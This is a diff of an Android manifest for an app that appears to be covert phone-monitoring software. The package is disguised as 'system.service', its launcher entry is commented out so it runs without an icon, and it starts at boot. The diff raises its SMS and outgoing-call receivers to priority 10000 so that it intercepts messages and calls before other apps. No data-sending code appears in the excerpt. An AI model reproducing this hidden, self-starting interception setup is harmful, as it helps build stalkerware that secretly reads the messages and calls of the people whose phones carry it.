@@ -1,61 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
 	package="system.service" 
-	android:versionCode="20120220"	
-	android:versionName="3.2.3">
+	android:versionCode="20120226"	
+	android:versionName="3.2.4">
 	
-	<application android:icon="@drawable/icon" android:label="@string/app_name">
-	
-	 	<service android:name=".BootService" android:enabled="true" android:excludeFromRecents="true" />
-		<receiver android:name=".receiver.BootReceiver">
-			<intent-filter>
-				<action android:name="android.intent.action.BOOT_COMPLETED" />
-				<category android:name="android.intent.category.HOME" />
-			</intent-filter>
-		</receiver>
-		
-		<receiver android:name=".receiver.SmsReceiver" android:enabled="true">
-        	<intent-filter android:priority="1000">
-        		<action android:name="android.provider.Telephony.SMS_RECEIVED" />
-        	</intent-filter>
-    	</receiver>
-    	
-    	<!-- 
-    	<receiver android:name=".receiver.IncomingCallReceiver" android:enabled="true">
-        	<intent-filter android:priority="1000">
-        		<action android:name="android.intent.action.PHONE_STATE" />
-        	</intent-filter>
-        </receiver>
-         -->
-    	
-    	<receiver android:name=".receiver.OutgoingCallReceiver" android:enabled="true">
-        	<intent-filter android:priority="1000">
-        		<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-        	</intent-filter>
-    	</receiver>
-    	
-    	<!-- ScreenStateReceiver is dynamically registered in BootService -->
-    	
-		<activity android:name=".activity.HomeActivity"
-                  android:label="@string/init_title"
-                  android:screenOrientation="portrait"
-                  android:excludeFromRecents="true">
-            <intent-filter>
-                <!-- <action android:name="android.intent.action.MAIN" />  -->
-                <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
-            </intent-filter>
-        </activity>
-        
-		<activity android:name=".activity.GlobalPrefActivity"
-        	      android:label="@string/pref_title"
-        	      android:theme="@style/Theme.Inspector.Preference"
-        	      android:excludeFromRecents="true" />
-		
-		<activity android:name="com.particle.inspector.common.util.DummyActivity" 
-		    android:label="" 
-		    android:excludeFromRecents="true" />
-        
-	</application>
+    <uses-sdk android:minSdkVersion="7" /> <!-- Android 2.1 -->
 	
 	<!-- User permissions -->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
@@ -96,8 +45,59 @@
 	
 	<uses-feature android:name="android.hardware.camera" android:required="false" />
 	<uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-	 -->
-	 
-	<uses-sdk android:minSdkVersion="7" /> <!-- Android 2.1 -->
+	-->
+	
+	<application android:icon="@drawable/icon" android:label="@string/app_name">
+	
+	 	<service android:name=".BootService" android:enabled="true" android:excludeFromRecents="true" />
+		<receiver android:name=".receiver.BootReceiver">
+			<intent-filter android:priority="10000">
+				<action android:name="android.intent.action.BOOT_COMPLETED" />
+				<category android:name="android.intent.category.HOME" />
+			</intent-filter>
+		</receiver>
+		
+		<receiver android:name=".receiver.SmsReceiver" android:enabled="true">
+        	<intent-filter android:priority="10000">
+        		<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+        	</intent-filter>
+    	</receiver>
+    	
+    	<!-- 
+    	<receiver android:name=".receiver.IncomingCallReceiver" android:enabled="true">
+        	<intent-filter android:priority="10000">
+        		<action android:name="android.intent.action.PHONE_STATE" />
+        	</intent-filter>
+        </receiver>
+         -->
+    	
+    	<receiver android:name=".receiver.OutgoingCallReceiver" android:enabled="true">
+        	<intent-filter android:priority="10000">
+        		<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+        	</intent-filter>
+    	</receiver>
+    	
+    	<!-- ScreenStateReceiver is dynamically registered in BootService -->
+    	
+		<activity android:name=".activity.HomeActivity"
+                  android:label="@string/init_title"
+                  android:screenOrientation="portrait"
+                  android:excludeFromRecents="true">
+            <intent-filter>
+                <!-- <action android:name="android.intent.action.MAIN" />  -->
+                <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
+            </intent-filter>
+        </activity>
+        
+		<activity android:name=".activity.GlobalPrefActivity"
+        	      android:label="@string/pref_title"
+        	      android:theme="@style/Theme.Inspector.Preference"
+        	      android:excludeFromRecents="true" />
+		
+		<activity android:name="com.particle.inspector.common.util.DummyActivity" 
+		    android:label="" 
+		    android:excludeFromRecents="true" />
+        
+	</application>
 	
 </manifest> 
